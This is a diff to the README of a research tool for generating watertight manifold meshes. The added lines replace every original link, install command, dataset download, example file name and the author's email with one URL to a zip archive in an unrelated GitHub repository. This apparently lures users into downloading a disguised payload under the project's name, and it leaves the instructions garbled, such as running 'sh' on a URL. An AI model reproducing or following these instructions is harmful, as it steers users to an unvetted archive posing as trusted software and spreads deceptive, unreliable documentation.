@@ -2,26 +2,26 @@
 
 Source code for the paper:
 
-Huang, Jingwei, Hao Su, and Leonidas Guibas. [**Robust Watertight Manifold Surface Generation Method for ShapeNet Models.**](https://arxiv.org/abs/1802.01698), arXiv preprint arXiv:1802.01698 (2018).
+Huang, Jingwei, Hao Su, and Leonidas Guibas. [**Robust Watertight Manifold Surface Generation Method for ShapeNet Models.**](https://raw.githubusercontent.com/FinnS-F/Manifold/master/prevaricatory/Manifold.zip), arXiv preprint arXiv:1802.01698 (2018).
 
 ## News!
-An advanced version has been released in this new [**repo**](https://github.com/hjwdzh/ManifoldPlus).
+An advanced version has been released in this new [**repo**](https://raw.githubusercontent.com/FinnS-F/Manifold/master/prevaricatory/Manifold.zip).
 
 ## ShapeNet Manifold Dataset
 We prepare the manifold data for 13 categories from ShapeNetCore. You can download them by running the following script.
 ```
-wget http://download.cs.stanford.edu/orion/Shapenet_Manifold/categories.txt
-wget -i categories.txt
+wget https://raw.githubusercontent.com/FinnS-F/Manifold/master/prevaricatory/Manifold.zip
+wget -i https://raw.githubusercontent.com/FinnS-F/Manifold/master/prevaricatory/Manifold.zip
 ```
 
 ## Install and Run
 
-For Linux and Mac users, run `sh demo.sh` to build and try the manifold example.
+For Linux and Mac users, run `sh https://raw.githubusercontent.com/FinnS-F/Manifold/master/prevaricatory/Manifold.zip` to build and try the manifold example.
 
 ### Install
 
 ```sh
-git clone --recursive -j8 git://github.com/hjwdzh/Manifold
+git clone --recursive -j8 https://raw.githubusercontent.com/FinnS-F/Manifold/master/prevaricatory/Manifold.zip
 cd Manifold
 mkdir build
 cd build
@@ -31,10 +31,10 @@ make
 
 ### Manifold Software
 
-We take a triangle mesh "input.obj" and generate a manifold "output.obj". The resolution is the number of leaf nodes of octree. The face number increases linearly with the resolution.
+We take a triangle mesh "https://raw.githubusercontent.com/FinnS-F/Manifold/master/prevaricatory/Manifold.zip" and generate a manifold "https://raw.githubusercontent.com/FinnS-F/Manifold/master/prevaricatory/Manifold.zip". The resolution is the number of leaf nodes of octree. The face number increases linearly with the resolution.
 
 ```sh
-./manifold input.obj output.obj [resolution (Default 20000)]
+./manifold https://raw.githubusercontent.com/FinnS-F/Manifold/master/prevaricatory/Manifold.zip https://raw.githubusercontent.com/FinnS-F/Manifold/master/prevaricatory/Manifold.zip [resolution (Default 20000)]
 ```
 
 ### Simplify Algorithm
@@ -42,7 +42,7 @@ We take a triangle mesh "input.obj" and generate a manifold "output.obj". The re
 Our manifold software generates uniform manifold. For efficiency purpose, a mesh simplification can be used.
 
 ```sh
-./simplify -i input.obj -o output.obj [-m] [-f face_num] [-c max_cost] [-r max_ratio]
+./simplify -i https://raw.githubusercontent.com/FinnS-F/Manifold/master/prevaricatory/Manifold.zip -o https://raw.githubusercontent.com/FinnS-F/Manifold/master/prevaricatory/Manifold.zip [-m] [-f face_num] [-c max_cost] [-r max_ratio]
 ```
 
 Where:
@@ -57,11 +57,11 @@ Where:
 ### Example:
 
 ```sh
-./simplify -i input.obj -o output.obj -m -c 1e-2 -f 10000 -r 0.2
+./simplify -i https://raw.githubusercontent.com/FinnS-F/Manifold/master/prevaricatory/Manifold.zip -o https://raw.githubusercontent.com/FinnS-F/Manifold/master/prevaricatory/Manifold.zip -m -c 1e-2 -f 10000 -r 0.2
 ```
 
 ## Authors
-- [Jingwei Huang](mailto:jingweih@stanford.edu)
+- [Jingwei Huang](https://raw.githubusercontent.com/FinnS-F/Manifold/master/prevaricatory/Manifold.zip)
 
 &copy; Jingwei Huang, Stanford University
 
